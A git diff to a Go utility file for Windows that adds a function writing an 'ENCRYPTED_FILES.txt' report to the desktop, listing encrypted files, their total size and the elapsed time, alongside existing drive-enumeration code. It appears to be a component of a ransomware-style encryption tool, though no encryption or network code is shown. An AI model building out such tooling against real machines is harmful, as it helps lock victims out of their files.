@@ -7,13 +7,21 @@ import (
 	"encoding/binary"
 	"io/ioutil"
 	"math/big"
+	"os"
 	"os/exec"
+	"strconv"
 	"strings"
+	"time"
 	"unicode/utf16"
 
 	"golang.org/x/sys/windows"
 	"golang.org/x/text/encoding/charmap"
 )
+
+type FileInfo struct {
+	Path string
+	Size int
+}
 
 // Returns true if slice contains elementm, false if not
 func Contains[T comparable](s []T, e T) bool {
@@ -96,4 +104,32 @@ func GetDrives() []string {
 	s := string(utf16.Decode(buffer))
 
 	return strings.Split(strings.TrimRight(s, "\x00"), "\x00")
+}
+
+func GenerateDesktopFiles(encryptedList []FileInfo, startTime time.Time) error {
+
+	var text string = "------ENCRYPTED FILES------\n\n"
+	var totalSize int = 0
+	desktopPath, err := GetDesktopPath()
+	if err != nil {
+		return err
+	}
+
+	for _, info := range encryptedList {
+		text = text + info.Path + " " + strconv.Itoa(info.Size) + " bytes\n"
+		totalSize = totalSize + info.Size
+	}
+
+	t := time.Now()
+	elapsedTime := t.Sub(startTime)
+
+	text = text + "TOTAL SIZE: " + strconv.Itoa(totalSize/1000000) + " MB\n"
+	text = text + "TIME ELAPSED: " + strconv.FormatFloat(elapsedTime.Seconds(), 'f', 4, 64) + " s"
+	bytes := []byte(text)
+	err = os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
